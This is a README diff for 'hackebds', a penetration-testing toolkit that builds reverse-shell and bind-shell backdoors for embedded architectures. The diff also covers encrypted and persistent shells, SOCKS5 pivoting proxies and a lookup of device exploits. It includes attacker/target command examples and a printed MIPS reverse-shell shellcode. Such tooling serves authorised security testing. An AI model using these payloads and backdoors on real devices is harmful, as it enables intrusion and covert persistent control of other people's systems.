@@ -4,639 +4,268 @@
 [![Downloads](https://static.pepy.tech/badge/hackebds)](https://pepy.tech/project/hackebds)
 ![PyPI - Downloads](https://img.shields.io/pypi/dm/hackebds)
 
+:link:[中文 readme](https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md)
 
-:link:[中文readme](https://github.com/doudoudedi/hackEmbedded/blob/main/readme_cn.md)
+## Overview
 
-## foreword
+`hackebds` is a toolkit for embedded-device payload generation, encrypted shell workflows, SOCKS5 proxy tunneling, and device information lookup.
 
->In the process of penetration and vulnerability mining of embedded devices, many problems have been encountered. One is that some devices do not have telnetd or ssh services to obtain an interactive shell，Some devices are protected by firewall and cannot be connected to it in the forward direction Reverse_shell is required, and the other is that memory corruption vulnerabilities such as stack overflow are usually Null bytes are truncated, so it is more troublesome to construct reverse_shellcode, so this tool was developed to exploit the vulnerability. This tool is developed based on the PWN module and currently uses the python2 language，**Has been updated to python3**
+The current branch uses a **pure ELF workflow** for encrypted shell and proxy features:
 
-## fuction
+- `reverse_shell_file` + `encrypted_shell_server` / `reverse_shell_server`
+- `bind_shell` + `bind_shell_client`
+- `reverse_proxy_file` + `reverse_proxy_server`
+- `forward_proxy_file`
 
+## What Changed In The New Version
 
-This tool is embedded in the security test of the device. There are two main functions:
+- Added encrypted reverse shell and encrypted bind shell for the supported architectures in the current tree
+- Added `encrypted_shell_server` / `reverse_shell_server` ELF listener so encrypted reverse shells can be received without Python runtime handlers
+- Added `bind_shell_client` ELF connector for `bind_shell`
+- Added reverse SOCKS5 proxy and forward SOCKS5 proxy ELF workflows
+- Added `aes` and `chacha20` cipher choices for encrypted shell/proxy traffic
+- Added `-bind_ip` for listener-side ELF binaries such as `bind_shell`, `encrypted_shell_server`, `reverse_proxy_server`, and `forward_proxy_file`
+- Kept `reverse_shell_file` and `reverse_proxy_file` as dial-out payloads: they use `-reverse_ip` and do not bind a local listener IP
 
-1. Generate **backdoor programs** (only ELF) of various architectures. The backdoor program is packaged in shellless pure shellcode and is smal，Pure static backdoor .**Armv5, Armv7, Armv8, mipsel, mips，mips64，mipsel64，powerpc, powerpc64，sparc,sparc64,mipsn32  are now supported, and they are still being updated** (PS:bash support is added to the reverse shell after version 0.3.1). If the backdoor of the reverse shell is generated with the - power parameter, the reverse shell will continue to be continuously generate on the target machine)
-2. Generate **reverse_shell shellcode** (only linux) of various architectures during the exploit process, and no null bytes, which facilitates the exploitation of memory corruption vulnerabilities on embedded devices. **Armv5, Armv7, Armv8, mipsel, mips, mips64, mipsel64, powerpc, powerpc64,sparc are now supported, and they are still being updated**
-3. Generate bind of various architectures bind_Shell(only ELF) file, -power can persistent bind_shell（ If you need to use  -power parameter, you can specify the bash shell, and please do not hang the process in the background to prevent data redirection errors）
-4. Sort out the exploitable vulnerability POC or EXP of the embedded device, and search and output the basic information and POC of the device model in use: Function of equipment, Architecture of equipment,Device CPU manufacturer,Device CPU model,WEB service program of the device, and so on
-5. Support command line generation backdoor and shell code, Strong anti hunting ability,characterized by light, small, efficient and fast
-6. The following issues were fixed in version 0.4.0:
-   
-    6.1 The issue of generating shellcode for armelv6.
-   
-    6.2 The issue of error reporting when using models and device models in all uppercase letters cannot be resolved
+## Install
 
-7. In version 0.4.0, the SQLite database was introduced to store the basic information of IoT devices and the corresponding CVE exploits or proofs of concept (POCs). The storage path is in the ~/.hackebds/hackebds.db file, which can be updated and content added manually. This file is not updated routinely. If you need the latest version of device information, POCs, and EXP, please check for updates on GitHub,
-8. The --mcpu parameter is specific to MIPS and ARM, primarily intended for programs that incorporate specific architectures, such as 24Kf.
-9. Added --firmware parameter, mainly used to detect the firmware architecture information, directly providing the command to generate a backdoor
-
-10. **New in version 0.4.1**: Major feature upgrade focused on encrypted traffic and proxying:
-
-    10.1 **ChaCha20 encrypted shell** — all shell I/O traffic is encrypted end-to-end using the ChaCha20 stream cipher. Key derivation is passphrase → SHA-256 → 256-bit key, with two separate nonces for bidirectional encryption (server→agent and agent→server). Implemented with a pipe+fork relay pattern across 6 architectures. Generated binaries are approximately 3–7KB depending on the architecture.
-
-    10.2 **SOCKS5 proxy binaries** — pure assembly ELF binaries (~2–5KB) that provide reverse and forward SOCKS5 proxy tunneling, with optional RFC 1929 username/password authentication. Useful for pivoting through embedded devices with a very small footprint.
-
-    10.3 **Full PTY terminal mode** for interactive sessions, so the reverse/bind shell behaves like a real terminal (job control, line editing, curses apps, etc.).
-
-    10.4 **Multi-session shell management** — a built-in console with tab completion and command history to manage multiple concurrent sessions from a single operator terminal.
-
-    10.5 **Unified server mode** that combines the SOCKS5 proxy server and the multi-session shell manager into a single console, so one process can handle both pivoting and shell sessions at the same time.
-
-    #### 0.4.1 command usage
-
-    Encrypted reverse shell — handler (attacker):
-
-    ```
-    hackebds -server encrypted_shell_reverse -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_secret_key"
-    ```
-
-    Encrypted reverse shell — generate payload (aarch64 / x64 / armelv7):
-
-    ```
-    hackebds -arch aarch64 -res reverse_shell_file \
-             -reverse_ip <attacker_ip> -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
-
-    hackebds -arch x64 -res reverse_shell_file \
-             -reverse_ip <attacker_ip> -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
-
-    hackebds -arch armelv7 -res reverse_shell_file \
-             -reverse_ip <attacker_ip> -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
-    ```
-
-    Full PTY mode (payload + handler):
-
-    ```
-    hackebds -arch aarch64 -res reverse_shell_file --pty \
-             -reverse_ip <attacker_ip> -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_key" \
-             -shell /bin/bash -filename eshell
-
-    hackebds -server encrypted_shell_reverse --pty \
-             -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_key"
-    ```
-
-    Encrypted bind shell — generate and connect:
-
-    ```
-    hackebds -arch aarch64 -res bind_shell \
-             -bind_port 5555 -passwd "s3cret" \
-             -cipher chacha20 -encrypt_key "my_secret_key" -filename ebind
-
-    hackebds -server encrypted_shell_bind \
-             -reverse_ip <target_ip> -reverse_port 5555 \
-             -cipher chacha20 -encrypt_key "my_secret_key"
-    ```
-
-    Persistent encrypted reverse shell (reconnect every 10s):
-
-    ```
-    hackebds -arch aarch64 -res reverse_shell_file --power -sleep 10 \
-             -reverse_ip <attacker_ip> -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_secret_key" -filename epshell
-    ```
-
-    Encrypted SOCKS5 reverse proxy — server, agent, and with auth:
-
-    ```
-    hackebds -res reverse_proxy_server -arch aarch64 \
-             -agent_port 8888 -socks_port 1080 \
-             -cipher chacha20 -encrypt_key "tunnel_key" -filename server
-
-    hackebds -arch mipsel -res reverse_proxy_file \
-             -reverse_ip <server_ip> -reverse_port 8888 \
-             -cipher chacha20 -encrypt_key "tunnel_key" -filename agent
-
-    hackebds -res reverse_proxy_server -arch x64 \
-             -agent_port 8888 -socks_port 1080 \
-             -socks_auth admin:secretpass \
-             -cipher chacha20 -encrypt_key "key" -filename server
-    ```
-
-    Python SOCKS5 reverse server mode:
-
-    ```
-    hackebds -server socks5_reverse \
-             -agent_port 8888 -socks_port 1080 \
-             -socks_auth admin:pass \
-             -cipher chacha20 -encrypt_key "key"
-    ```
-
-    Multi-session shell manager and unified proxy+shell server:
-
-    ```
-    hackebds -server encrypted_shell_manager \
-             -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_key"
-
-    hackebds -server unified \
-             -agent_port 8888 -socks_port 1080 \
-             -reverse_port 4444 \
-             -cipher chacha20 -encrypt_key "my_key"
-    ```
-
-    Manager console commands:
-
-    ```
-    hackebds> list                    # List active sessions
-    hackebds> interact <id>           # Enter interactive shell
-    hackebds> kill <id>               # Kill session
-    hackebds> maxconn <n>             # Set max sessions per IP
-    hackebds> status                  # Show server status
-    hackebds> notify [on|off]         # Toggle notifications
-    hackebds> pool                    # Show proxy agent pool
-    hackebds> exit                    # Stop and exit
-    ```
-
-## install
-
-```
-use docker:
-docker pull doudoudedi/hackebds:3.8
-(This version will encounter issues with generating shellcode in armv5, and will be fixed in the next version)
+```bash
+python3 -m pip install -U hackebds
 ```
 
+Local development install:
 
-Just use pip to install, if the installation fails, try to use sudo to install
-
-```
-Use pip install:
-sudo pip install -U hackebds
-
-local install:
+```bash
 git clone https://github.com/doudoudedi/hackEmbedded
-sudo ./start.sh
+cd hackEmbedded
+python3 -m pip install -e .
 ```
 
-（If you want this tool to run on a MacOS system, you need to include python/bin in the bashrc environment variable）
+## Build On Another Machine
 
-```
-echo 'export PATH="/Users/{you id}/Library/Python/{your installed python}/bin:$PATH"'>> ~/.bashrc
-```
+If you rebuild release wheels on another host, use the source zip and `build_release.py`.
 
-![image-20221125095653018](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221125095653018.png)
-
-
-![image-20221121142622451](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221121142622451.png)
-
-#### Instructions for use
-
-![image-20221118202002242](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221118202002242.png)
-
-Please install the corresponding binutils environment before use
-expample:
-
-```
-Ubuntu（debian）:
-  apt search binutils | grep arm（You can replace it here， if not please execute "apt update" first）
-  apt install binutils-arm-linux-gnueabi/hirsute
- MacOS:
- 	 https://github.com/Gallopsled/pwntools-binutils
- 	 brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
+```bash
+unzip hackebds-0.4.3-source-for-x86-build.zip
+cd hackebds-0.4.0.backup-20260411T142751Z
+python3 -m pip install -U pip setuptools wheel cython
+python3 build_release.py --plat manylinux2014_x86_64
 ```
 
-1. Use the command line to generate the backdoor file name, shellcode, bindshell, etc
+## Required Binutils
 
-   ![image-20221206180431454](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221206180431454.png)
+Install target-arch binutils before generating non-native ELF files.
 
-   Redesigned the relationship between model and arch, enabled the regeneration backdoor to directly specify the device model, but the model needs to match the name listed in the - l parameter
-
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -model DIR-816 -res reverse_shell_file
-   or
-   hackebds -lhost 127.0.0.1 -lport 9999 -model DIR-816 -res reverse_shell_file
-   ```
-
-   ![image-20230710112652819](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230710112652819.png)
-
-   
-
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shellcode
-   or
-   hackebds -lhost 127.0.0.1 -lport 9999 -arch mipsel -res reverse_shellcode
-   ```
-
-   ![image-20221102181217933](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102181217933.png)
-
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file
-   or
-   hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file
-   ```
-
-   By default, the reverse shell backdoor is created using sh. If bash is required (PS: here, the bash command needs to exist on the target device)
-
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash
-   or 
-   hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash
-   ```
-
-   If you need to generate a backdoor and constantly create reverse shells (the CPU occupied by the test is about% 8)
-
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
-   or
-   hackebds -lhost 127.0.0.1 -lport 8081 -arch armelv7 -res reverse_shell_file -shell bash -power
-   ```
-   If you need to create a reverse shell every 5 seconds
-   ```
-   hackebds -reverse_ip 127.0.0.1 -reverse_port 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
-   or
-   hackebds -lhost 127.0.0.1 -lport 9999 -arch mipsel -res reverse_shell_file -power -sleep 5
-   ```
-
-   ![image-20221102183017775](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102183017775.png)
-
-   ```
-   hackebds -bind_port 8080 -passwd 1234 -arch mips -model DIR-823 -res bind_shell
-   ```
-
-   Create bind_shell to monitor the shell as sh, -power fuction can give -shell bash	
-
-   ```
-   hackebds -bind_port 8081 -arch armelv7 -res bind_shell -passwd 1231 -power
-   ```
-
-   The bind_shell process will not stop after being disconnected, and supports repeated connections (currently this function is not supported by powerpc and sparc series)
-
-   ![image-20221102182939434](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221102182939434.png)
-
-   
-
-   Generate cmd_file function is updated. Only need to specify the - cmd parameter to generate programs for various architectures to execute corresponding commands , -envp Environment variables are separated by commas
-
-   ```
-   hackebds  -cmd "ls -al /" -arch powerpc  -res cmd_file
-   ```
-
-   ![image-20230106153459125](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230106153459125.png)
-
-   The list relationship between the output model and the architecture is added to the function of generating the back door of the specified model to facilitate the user to observe and modify. The output information will be enhanced after version 0.3.5, such as (100+ device information, POC80+or so):
-   Function of equipment
-   Architecture of equipment
-   Device CPU manufacturer
-   Device CPU model
-   WEB service program of the device
-   Device default SSH service support
-   Can monitoring be realized
-   Device default telnet user password
-   Device sdk support
-   Openwrt support for devices
-   Whether the device is vulnerable
-   POC output
-
-   ```
-   hackebds -l
-   ```
-
-   ![image-20230213151548871](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213151548871.png)
-
-   Added retrieval of device information, using - s to search for the - model parameter. This search is fuzzy and case insensitive. Try to use lowercase when inputting, and finally output the device information with the highest matching degree with the input（The introduction of EXP and POC in version 0.3.7)
-
-   If the following error occurs
-
-   hackebds: error: argument -model: expected one argument
-
-   Please set all parameters to lowercase or lowercase mixed with uppercase. I guess it is due to the conflict between python and bash in the interpretation of uppercase and lowercase letters
-
-   ```
-   hackebds -model ex200 -s
-   ```
-
-   If the following warning occurs during command output
-
-   /usr/local/lib/python3.8/dist-packages/fuzzywuzzy/fuzz.py:11: UserWarning: Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning
-     warnings.warn('Using slow pure-python SequenceMatcher. Install python-Levenshtein to remove this warning')
-
-   If the following warning occurs during command output, you can use the following command to install python-levenshtein. After installation, the command retrieval speed can be increased by about 4 times
-
-   ```
-   pip install python-levenshtein
-   ```
-
-   ![image-20230213105520663](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105520663-20230213151846373.png)
-
-   The POC corresponding to the generated device can use - p or -- poc, which may be python scripts, commands, etc., and may need to be modified by yourself
-
-   ```
-   hackebds -model ex200 -p
-   ```
-
-   ![image-20230213105925356](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213105925356.png)
-
-   Added search for CVE
-
-   ```
-   hackebds -CVE CVE-2019-17621
-   ```
-
-   ![image-20230530172408297](https://myblog-1257937445.cos.ap-nanjing.myqcloud.com/img/image-20230530172408297.png)
-
-   
-
-   
-
-   If a vulnerability is found in the test and you want to add the basic information of a new device to this tool, you can use the - add function for POC files or "/tmp/model_tree_info/" The format of the directory directory of the new device under the info/directory can refer to the standard generated format. After the insertion, you can use the tool search and POC generation functions，Finally, if you need to fill in the POC file information, you can put it in "/tmp/model_tree_info/xxx/POC" directory will be read if retrieved again
-
-   ```
-   hackebds -add
-   ```
-
-   ![image-20230213111024854](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20230213111024854.png)
-
-   If there are device information errors, POC errors, or you want to integrate your collected device information with vulnerabilities, please contact me doudoudedi233@gmail.com
-
-   
-
-3. Generate backdoor programs of various architectures, encapsulate pure shellcode, and successfully connect to the shell
-
-```
->>> from hackebds import *
->>> mipsel_backdoor(reverse_ip,reverse_port)
->>> mips_backdoor(reverse_ip,reverse_port)
->>> aarch64_backdoor(reverse_ip,reverse_port)
->>> armelv5_backdoor(reverse_ip,reverse_port)
->>> armelv7_backdoor(reverse_ip,reverse_port)
->>> armebv5_backdoor(reverse_ip,reverse_port)
->>> armebv7_backdoor(reverse_ip,reverse_port)
->>> mips64_backdoor(reverse_ip,reverse_port)
->>> mips64el_backdoor(reverse_ip,reverse_port)
->>> x86el_backdoor(reverse_ip,reverse_port)
->>> x64el_backdoor(reverse_ip, reverse_port)
->>> sparc32.sparc_backdoor(reverse_ip, reverse_port)#big endian
->>> sparc64.sparc_backdoor(reverse_ip, reverse_port)#big endian
->>> powerpc_info.powerpc_backdoor(reverse_ip, reverse_port)
->>> powerpc_info.powerpcle_backdoor(reverse_ip, reverse_port)
->>> powerpc_info.powerpc64_backdoor(reverse_ip, reverse_port)
->>> powerpc_info.powerpc64le_backdoor(reverse_ip, reverse_port)
->>> x86_bind_shell(listen_port, passwd)
->>> x64_bind_shell(listen_port, passwd)
->>> armelv7_bind_shell(listen_port, passwd)
->>> aarch64_ bind_ shell(listen_port, passwd)
->>> mips_bind_shell(listen_port, passwd)
->>> mipsel_bind_shell(listen_port, passwd)
->>> sparc32.sparc_bind_shell(listen_port, passwd)
->>> powerpc_info.powerpc_bind_shell(listen_port, passwd)
+```bash
+sudo apt install binutils-aarch64-linux-gnu
+sudo apt install binutils-arm-linux-gnueabi
+sudo apt install binutils-mips-linux-gnu
+sudo apt install binutils-mipsel-linux-gnu
+sudo apt install binutils-mips64-linux-gnuabi64
+sudo apt install binutils-mips64el-linux-gnuabi64
+sudo apt install binutils-powerpc-linux-gnu
+sudo apt install binutils-riscv64-linux-gnu
 ```
 
-（Note that the maximum password length is 4 characters for x86（32bits） and 8 characters for x64（64bits））
+macOS users can use pwntools binutils:
 
-```
->>> mipsel_backdoor("127.0.0.1",5566)
-[+] reverse_ip is: 127.0.0.1
-[+] reverse_port is: 5566
-[*] waiting 3s
-[+] mipsel_backdoor is ok in current path ./
->>>
+```bash
+brew install https://raw.githubusercontent.com/Gallopsled/pwntools-binutils/master/osx/binutils-$ARCH.rb
 ```
 
-![image-20221028144512270](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144512270.png)
+## Usage Examples
 
-```
->>> from hackebds import *
->>> x86_bind_shell(4466,"doud")
-[+] bind port is set to 4466
-[+] passwd is set to 'doud'
-0x0000000064756f64
-[*] waiting 3s
-[+] x86_bind_shell is ok in current path ./
->>>
-```
+### 1. Encrypted Reverse Shell
 
-![image-20221028143802937](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028143802937.png)
+Attacker side:
 
-Then connect to the port bound to the device (password exists)
+```bash
+hackebds -arch x64 -res encrypted_shell_server \
+  -reverse_port 4444 \
+  -bind_ip 192.168.56.1 \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename reverse_server.elf
 
-![image-20221028144136069](https://raw.githubusercontent.com/doudoudedi/blog-img/master/uPic/image-20221028144136069.png)
-
-2. Generates the use-back shellcode (no free) null bytes corresponding to various architectures
-
-```
->>> from hackebds import *
->>> mipsel_reverse_sl(reverse_ip,reverse_port)
->>> mips_reverse_sl(reverse_ip,reverse_port)
->>> aarch64_reverse_sl(reverse_ip,reverse_port)
->>> armelv5_reverse_sl(reverse_ip,reverse_port)
->>> armelv7_reverse_sl(reverse_ip,reverse_port)
->>> armebv5_reverse_sl(reverse_ip,reverse_port)
->>> armebv7_backdoor(reverse_ip,reverse_port)
->>> mips64_reverse_sl(reverse_ip,reverse_port)
->>> mips64el_reverse_sl(reverse_ip,reverse_port)
->>> android_aarch64_backdoor(reverse_ip,reverse_port)
->>> x86el_reverse_sl(reverse_ip,reverse_port)
->>> x64el_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppc_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppcle_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppc64_reverse_sl(reverse_ip,reverse_port)
->>> powerpc_info.ppc64le_reverse_sl(reverse_ip,reverse_port)
+chmod +x reverse_server.elf
+./reverse_server.elf
 ```
 
-example:
+Target side:
 
-```
->>> from hackebds import *
->>> shellcode=mipsel_reverse_sl("127.0.0.1",5566)
-[+] No NULL byte shellcode for hex(len is 264):
-\xfd\xff\x19\x24\x27\x20\x20\x03\xff\xff\x06\x28\x57\x10\x02\x34\xfc\xff\xa4\xaf\xfc\xff\xa5\x8f\x0c\x01\x01\x01\xfc\xff\xa2\xaf\xfc\xff\xb0\x8f\xea\x41\x19\x3c\xfd\xff\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xff\xfe\x19\x3c\x80\xff\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\xfc\xff\xb0\xaf\xfc\xff\xa4\x8f\x20\x28\xa0\x03\xef\xff\x19\x24\x27\x30\x20\x03\x4a\x10\x02\x34\x0c\x01\x01\x01\xf7\xff\x85\x20\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfe\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\xfd\xff\x19\x24\x27\x28\x20\x03\xdf\x0f\x02\x24\x0c\x01\x01\x01\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf8\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xfc\xff\xa9\xaf\xf8\xff\xbd\x27\x20\x20\xa0\x03\x69\x6e\x09\x3c\x2f\x62\x29\x35\xf4\xff\xa9\xaf\x97\xff\x19\x3c\xd0\x8c\x39\x37\x27\x48\x20\x03\xf8\xff\xa9\xaf\xfc\xff\xa0\xaf\xf4\xff\xbd\x27\xff\xff\x05\x28\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\xfb\xff\x19\x24\x27\x28\x20\x03\x20\x28\xa5\x03\xfc\xff\xa5\xaf\xfc\xff\xbd\x23\x20\x28\xa0\x03\xff\xff\x06\x28\xab\x0f\x02\x34\x0c\x01\x01\x01
-```
+```bash
+hackebds -arch mipsel -res reverse_shell_file \
+  -reverse_ip 192.168.56.1 -reverse_port 4444 \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename reverse_payload.elf
 
-### 0.4.1 encrypted shell & SOCKS5 proxy usage
-
-The 0.4.1 release adds ChaCha20 encrypted reverse/bind shells, pure-assembly SOCKS5 proxy ELFs, a full-PTY interactive mode, a multi-session shell manager and a unified proxy+shell server. All new CLI usage is listed below.
-
-1) Encrypted reverse shell — handler on the attacker side:
-
-```
-hackebds -server encrypted_shell_reverse -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_secret_key"
+chmod +x reverse_payload.elf
+./reverse_payload.elf
 ```
 
-2) Encrypted reverse shell — generate target payload (aarch64 / x64 / armelv7):
+Notes:
 
-```
-hackebds -arch aarch64 -res reverse_shell_file \
-         -reverse_ip <attacker_ip> -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+- `reverse_shell_file` does not support `-bind_ip`
+- `encrypted_shell_server` supports `-bind_ip`
+- change `-cipher chacha20` to `-cipher aes` to use AES
 
-hackebds -arch x64 -res reverse_shell_file \
-         -reverse_ip <attacker_ip> -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
+### 2. Encrypted Bind Shell
 
-hackebds -arch armelv7 -res reverse_shell_file \
-         -reverse_ip <attacker_ip> -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_secret_key" -filename eshell
-```
+Target side:
 
-3) Full PTY interactive mode (payload + handler):
-
-```
-hackebds -arch aarch64 -res reverse_shell_file --pty \
-         -reverse_ip <attacker_ip> -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_key" \
-         -shell /bin/bash -filename eshell
-
-hackebds -server encrypted_shell_reverse --pty \
-         -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_key"
-```
-
-4) Encrypted bind shell — generate and connect:
-
-```
+```bash
 hackebds -arch aarch64 -res bind_shell \
-         -bind_port 5555 -passwd "s3cret" \
-         -cipher chacha20 -encrypt_key "my_secret_key" -filename ebind
+  -bind_port 5555 \
+  -bind_ip 192.168.56.20 \
+  -passwd "s3cr3t" \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename bind_shell.elf
 
-hackebds -server encrypted_shell_bind \
-         -reverse_ip <target_ip> -reverse_port 5555 \
-         -cipher chacha20 -encrypt_key "my_secret_key"
+chmod +x bind_shell.elf
+./bind_shell.elf
 ```
 
-5) Persistent encrypted reverse shell (reconnect every 10s):
+Attacker side:
 
-```
-hackebds -arch aarch64 -res reverse_shell_file --power -sleep 10 \
-         -reverse_ip <attacker_ip> -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_secret_key" -filename epshell
-```
+```bash
+hackebds -arch x64 -res bind_shell_client \
+  -reverse_ip 192.168.56.20 -reverse_port 5555 \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename bind_client.elf
 
-6) Encrypted SOCKS5 reverse proxy — server, agent, and with RFC 1929 auth:
-
-```
-hackebds -res reverse_proxy_server -arch aarch64 \
-         -agent_port 8888 -socks_port 1080 \
-         -cipher chacha20 -encrypt_key "tunnel_key" -filename server
-
-hackebds -arch mipsel -res reverse_proxy_file \
-         -reverse_ip <server_ip> -reverse_port 8888 \
-         -cipher chacha20 -encrypt_key "tunnel_key" -filename agent
-
-hackebds -res reverse_proxy_server -arch x64 \
-         -agent_port 8888 -socks_port 1080 \
-         -socks_auth admin:secretpass \
-         -cipher chacha20 -encrypt_key "key" -filename server
+chmod +x bind_client.elf
+./bind_client.elf
 ```
 
-7) Python SOCKS5 reverse server mode:
+Then enter:
 
-```
-hackebds -server socks5_reverse \
-         -agent_port 8888 -socks_port 1080 \
-         -socks_auth admin:pass \
-         -cipher chacha20 -encrypt_key "key"
-```
-
-8) Multi-session shell manager and unified proxy+shell server:
-
-```
-hackebds -server encrypted_shell_manager \
-         -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_key"
-
-hackebds -server unified \
-         -agent_port 8888 -socks_port 1080 \
-         -reverse_port 4444 \
-         -cipher chacha20 -encrypt_key "my_key"
+```text
+s3cr3t
+id
+uname -a
+exit
 ```
 
-9) Manager console commands:
+### 3. Persistent Reverse Shell
 
+Listener:
+
+```bash
+hackebds -arch x64 -res encrypted_shell_server --power \
+  -reverse_port 4444 \
+  -bind_ip 192.168.56.1 \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename power_server.elf
+
+./power_server.elf
 ```
-hackebds> list                    # List active sessions
-hackebds> interact <id>           # Enter interactive shell
-hackebds> kill <id>               # Kill session
-hackebds> maxconn <n>             # Set max sessions per IP
-hackebds> status                  # Show server status
-hackebds> notify [on|off]         # Toggle notifications
-hackebds> pool                    # Show proxy agent pool
-hackebds> exit                    # Stop and exit
+
+Payload:
+
+```bash
+hackebds -arch armelv7 -res reverse_shell_file --power -sleep 10 \
+  -reverse_ip 192.168.56.1 -reverse_port 4444 \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename power_payload.elf
 ```
 
-## chips and architectures
+### 4. Encrypted Reverse SOCKS5 Proxy
 
-Tests can leverage chips and architectures
+Server:
 
-Mips:
-MIPS 74kc V4.12 big endian,
-MIPS 24kc V5.0  little endian (Ralink SoC) like MediaTek MT7621
-Ingenic Xburst V0.0  FPU V0.0  little endian
+```bash
+hackebds -arch x64 -res reverse_proxy_server \
+  -agent_port 7000 -socks_port 1080 \
+  -bind_ip 192.168.56.1 \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename reverse_proxy_server.elf
 
-Armv7:
-Allwinner(全志)V3s
+chmod +x reverse_proxy_server.elf
+./reverse_proxy_server.elf
+```
 
-Armv8:
-Qualcomm Snapdragon 660
-BCM2711
+Agent:
 
-Powerpc, sparc: qemu
+```bash
+hackebds -arch mips64el -res reverse_proxy_file \
+  -reverse_ip 192.168.56.1 -reverse_port 7000 \
+  -cipher chacha20 -encrypt_key "demo-key" \
+  -filename reverse_proxy_agent.elf
 
+chmod +x reverse_proxy_agent.elf
+./reverse_proxy_agent.elf
+```
 
-## :beer:enjoy hacking
+Test:
 
+```bash
+curl --socks5-hostname 127.0.0.1:1080 http://example.com/
+```
 
-## updating
+Auth-enabled server:
 
- 2022.4.19 Added support for aarch64 null-byte reverse_shellcode
+```bash
+hackebds -arch x64 -res reverse_proxy_server \
+  -agent_port 7000 -socks_port 1080 \
+  -bind_ip 192.168.56.1 \
+  -socks_auth user:pass \
+  -cipher aes -encrypt_key "demo-key" \
+  -filename reverse_proxy_server_auth.elf
+```
 
- 2022.4.30 Reduced amount of code using functions and support python3
+UDP note:
 
- 2022.5.5 0.0.8 version Solved the bug that mips_reverse_sl and mipsel_reverse_sl were not enabled, added mips64_backdoor, mips64_reverse_sl generation and mips64el_backdoor, mips64el_reverse_sl generation
+- reverse SOCKS5 proxy has UDP support on the implemented non-SPARC proxy paths
+- `sparc` / `sparc64` should not be treated as UDP-supported
 
- 2022.5.21 0.0.9 version changed the generation method of armel V5 backdoor and added the specified generation of riscv-v64 backdoor
+### 5. Forward SOCKS5 Proxy
 
- 2022.6.27 0.1.0 Added Android backdoor generation
+```bash
+hackebds -arch x64 -res forward_proxy_file \
+  -listen_port 1081 \
+  -bind_ip 192.168.56.1 \
+  -filename forward_proxy.elf
 
- 2022.10.26 0.1.5 Fixed some problems and added some automatic generation functions of bindshell specified port passwords
+chmod +x forward_proxy.elf
+./forward_proxy.elf
+```
 
- 2022.10.27 0.1.6 Add support armv7el_bind_shell(2022.10.27)
+Test:
 
